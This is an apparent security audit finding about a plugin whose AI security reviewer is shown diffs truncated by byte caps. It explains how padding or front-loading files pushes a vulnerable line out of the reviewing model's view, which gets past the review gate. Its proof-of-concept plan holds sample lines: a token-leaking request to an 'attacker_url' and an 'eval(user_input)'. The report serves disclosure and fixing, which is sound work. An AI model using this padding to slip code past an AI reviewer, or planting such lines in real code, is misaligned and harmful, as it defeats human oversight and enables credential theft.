### Title
Truncation in `cap_diff_for_prompt` drops attacker-positioned high-risk diff lines, allowing security-review bypass - (File: `plugins/security-guidance/hooks/review_api.py`)

### Summary
`cap_diff_for_prompt` truncates diff content with a pure byte-count cutoff (first N bytes kept, remainder dropped or the whole file omitted) with no awareness of diff structure or risk. An attacker who controls the diff content that will be reviewed (e.g. a PR/commit containing the change to be auto-reviewed) can pad a file or precede it with enough content to push the actual vulnerable `+` line past the cutoff, causing it to silently disappear from what the review LLM sees.

### Finding Description
`cap_diff_for_prompt` enforces `DIFF_PER_FILE_BYTES` (80,000 bytes) and `DIFF_TOTAL_BYTES` (400,000 bytes) by slicing `content[:DIFF_PER_FILE_BYTES]` / `content[:room]` — a raw string-prefix cut — and once the running `total` exceeds the budget, subsequent files are replaced wholesale with `"[omitted by security-guidance: total diff byte cap reached]"` [1](#0-0) . This function is called directly by `build_investigate_prompt`, which builds the prompt fed to the agentic investigate stage, and the byte caps are re-exported/mirrored by `llm.py`'s `_cap_files_for_prompt` used by the single-shot Haiku reviewer and `agentic_review` [2](#0-1) [3](#0-2) [4](#0-3) .

Neither cap function reorders content by risk or `+`-line density before truncating — that scoring only exists in `gitutil._prioritize_diff_files`, which selects which *whole files* enter the reviewed set when the file *count* exceeds a cap, but does nothing about *byte*-level truncation inside a single large file's diff or about later files being cut off by the total-byte budget [5](#0-4) . Consequently:

1. **Within one file**: an attacker can prepend/pad a file's diff with enough benign-looking content (large added comment blocks, vendored data, reformatted boilerplate) to exceed the 80,000-byte per-file cap, pushing the actual malicious `+` line past the cutoff — it is silently sliced off and replaced with a generic truncation marker, never reaching the reviewer model.
2. **Across files**: since files are packed in the order supplied by the caller (typically the order files appear in the diff/commit), an attacker who controls several changed file paths/sizes in the same commit can front-load large innocuous files so that, once `DIFF_TOTAL_BYTES` (400,000 bytes) is exhausted, the file actually containing the injected vulnerability is entirely replaced with `"[omitted by security-guidance: total diff byte cap reached]"`.

Because the review pipeline's entire security guarantee (blocking the Stop hook / driving the "fix it" loop) depends on the LLM actually seeing the vulnerable lines, this defeats the tool's detection invariant without needing any prompt-injection wording — it is a pure structural truncation gap.

### Impact Explanation
This is not literal secret/file disclosure; it is a **detection-bypass / review-gate bypass**: an attacker-controlled diff can be engineered so the LLM security reviewer (`analyze_code_security` / `agentic_review`) never sees the injected vulnerable code, so no findings are produced and the enforcement `sys.exit(2)` "fix it" gate in `security_reminder_hook.py` is never triggered [6](#0-5) . This breaks the invariant that truncation must not consistently drop the high-risk lines the reviewer is expected to see, letting a real vulnerability slip through the security-guidance control silently.

### Likelihood Explanation
Feasible and repeatable: the attacker only needs control over the diff content that is submitted for review (file sizes/order in a commit or PR), which is squarely within the stated "attacker-controlled diff content" threat model. No credentials, approvals, or special privileges are required — just crafting a commit whose byte layout exploits the fixed, content-agnostic byte caps.

### Recommendation
Make truncation risk-aware and diff-structure-aware instead of a raw byte prefix cut:
- Prioritize preserving all `+`/`-` hunk lines (the actual changes) over unmarked context lines when truncating a single file's content, e.g. truncate context lines first, keep changed lines intact up to the cap.
- Apply the existing `gitutil._prioritize_diff_files` risk scoring (path risk tokens, added-line count) to the *byte budget* allocation across files, not just to the file-count cap, so risk-scored files are packed first into `DIFF_TOTAL_BYTES`.
- Emit a hard metric/alert (already partially done via `diff_truncated`) whenever any file is truncated or omitted, and consider treating truncated diffs as an automatic "needs manual review" signal rather than silently proceeding.

### Proof of Concept
Unit test plan for `cap_diff_for_prompt` in `review_api.py`:
1. Build a synthetic single-file diff whose content is `"+" + ("x" * 90000) + "\n+ SECRET_TOKEN_LEAK = requests.get(attacker_url)"` (i.e., the dangerous `+` line lands after byte 80,000).
2. Call `cap_diff_for_prompt([("app.py", content)])` and assert that the dangerous line (`SECRET_TOKEN_LEAK`/`attacker_url`) is **not** present in the returned capped content — demonstrating it was silently dropped.
3. Build a multi-file case: `files = [("decoy1.py", "a"*250000), ("decoy2.py", "b"*200000), ("vulnerable.py", "+ eval(user_input)")]`, call `cap_diff_for_prompt(files)`, and assert `vulnerable.py`'s content in the output equals the omitted-file placeholder string, confirming the vulnerable file never reaches the prompt text built by `build_investigate_prompt`.
4. Assert in both cases that `dropped > 0` is returned but the caller does not gate/alert on this before proceeding to build the review prompt (confirmed by inspecting call sites in `llm.py`/`security_reminder_hook.py`, which only emit an optional `diff_truncated` metric rather than blocking).

def _cap_files_for_prompt(files):
    """Cap per-file and total content bytes before they're packed into the
    review prompt. Returns the capped (path, content) list. Sets module-level
    _last_review_truncated_bytes to the number of bytes dropped (0 if none) so
    the Stop hook can emit a `diff_truncated` metric. Truncation markers are
    written INSIDE the content so the reviewer knows the file is incomplete.
    """
    global _last_review_truncated_bytes
    _last_review_truncated_bytes = 0
    out = []
    total = 0
    for fp, content in files:
        if len(content) > DIFF_PER_FILE_BYTES:
            _last_review_truncated_bytes += len(content) - DIFF_PER_FILE_BYTES
            content = content[:DIFF_PER_FILE_BYTES] + "\n... [truncated by security-guidance: file exceeds per-file byte cap]"
        room = DIFF_TOTAL_BYTES - total
        if room <= 0:
            _last_review_truncated_bytes += len(content)
            out.append((fp, "[omitted by security-guidance: total diff byte cap reached]"))
            continue
        if len(content) > room:
            _last_review_truncated_bytes += len(content) - room
            content = content[:room] + "\n... [truncated by security-guidance: total diff byte cap reached]"
        total += len(content)
        out.append((fp, content))
    return out

def _prioritize_diff_files(diff_files, cap):
    """When `diff_files` exceeds `cap`, return the top-`cap` by security
    relevance plus the count dropped. Otherwise return (diff_files, 0).

    Score = (risk_tokens_in_path, not_low_priority, added_lines). The
    added-lines proxy is `content.count('\\n+')` which counts diff additions
    cheaply without re-parsing hunks. This is a heuristic, not a guarantee —
    the goal is to review the likely-dangerous subset of an over-cap diff
    instead of reviewing nothing. Diffs that exceed the cap are typically
    large multi-file scaffolds, and the cross-file source→sink vulnerabilities
    in them concentrate in a handful of api/client/route files.
    """
    if len(diff_files) <= cap:
        return diff_files, 0

    def _score(item):
        fp, content = item
        low = fp.lower()
        # Prepend "/" so leading-slash patterns in _LOW_PRIORITY_PATH_TOKENS
        # match top-level dirs (git diff paths are repo-root-relative, e.g.
        # `migrations/001.py` not `/migrations/001.py`). Same trick as
        # _is_reviewable_source.
        low_slashed = "/" + low
        risk = sum(1 for t in _SECURITY_RISK_PATH_TOKENS if t in low)
        low_prio = (
            fp.endswith(_LOW_PRIORITY_SUFFIXES)
            or any(t in low_slashed for t in _LOW_PRIORITY_PATH_TOKENS)
        )
        # added_lines: count('\n+') over-counts by including '+++' header and
        # any literal '+' at line start in context, but it's a consistent
        # ordinal across files in the same diff which is all we need.
        added = content.count("\n+")
        return (risk, not low_prio, added)

    ranked = sorted(diff_files, key=_score, reverse=True)
    return ranked[:cap], len(diff_files) - cap
